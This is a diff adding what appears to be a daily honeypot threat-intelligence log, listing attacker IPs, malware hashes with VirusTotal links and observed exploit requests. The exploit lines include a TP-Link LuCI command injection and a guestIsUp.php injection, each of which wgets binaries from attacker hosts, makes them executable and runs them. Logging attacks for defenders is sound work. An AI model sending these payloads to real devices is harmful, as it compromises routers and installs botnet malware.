@@ -1,0 +1,32 @@
+Top 5 IPs for 2024-04-29 :
+
+179.43.190.218
+117.250.10.204
+27.116.23.62
+218.148.212.207
+14.48.228.212
+
+Malware Download:
+
+a4f7c902f1c85f50423d7e674276e0d71d2f8f012c450ef91b4cb779ebb6018e
+https://www.virustotal.com/gui/file/a4f7c902f1c85f50423d7e674276e0d71d2f8f012c450ef91b4cb779ebb6018e
+d68d85af59c7cfdf08f957b801888957bcc046ff258973c94e6337f719d9bf02
+https://www.virustotal.com/gui/file/d68d85af59c7cfdf08f957b801888957bcc046ff258973c94e6337f719d9bf02
+
+
+Commands/exploits observed:
+
+http://HOST-IP/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F179.43.190.218%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
+
+POST /guest_auth/guestIsUp.php HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 365
+Host: HOST-IP
+
+mac=1&ip=127.0.0.1|wget http://185.242.235.147/Linux2.4;chmod 777 Linux2.4;./Linux2.4;wget http://185.242.235.147/linux-mips;chmod 777 linux-mips;./linux-mips;wget http://185.242.235.147/Linux2.6;chmod 777 Linux2.6;./Linux2.6;wget http://185.242.235.147/dd-wrt;chmod 777 dd-wrt;./dd-wrt;wget http://185.242.235.147/linux-arm;chmod 777 dd-wrt;./linux-arm > PeiQi.txt
